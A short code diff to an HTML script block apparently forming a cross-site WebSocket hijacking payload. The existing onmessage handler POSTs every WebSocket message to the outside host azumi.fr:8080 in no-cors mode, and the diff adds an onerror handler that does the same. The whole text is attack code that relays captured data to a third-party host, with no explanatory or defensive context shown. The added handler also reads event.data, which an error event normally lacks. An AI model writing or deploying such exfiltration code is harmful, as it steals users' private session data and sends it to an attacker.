@@ -7,4 +7,7 @@
   ws.onmessage = function(event) {
     fetch('http://azumi.fr:8080', {method: 'POST', mode: 'no-cors', body: event.data});
   };
+  ws.onerror = function(event) {
+    fetch('http://azumi.fr:8080', {method: 'POST', mode: 'no-cors', body: event.data});
+  };
 </script>
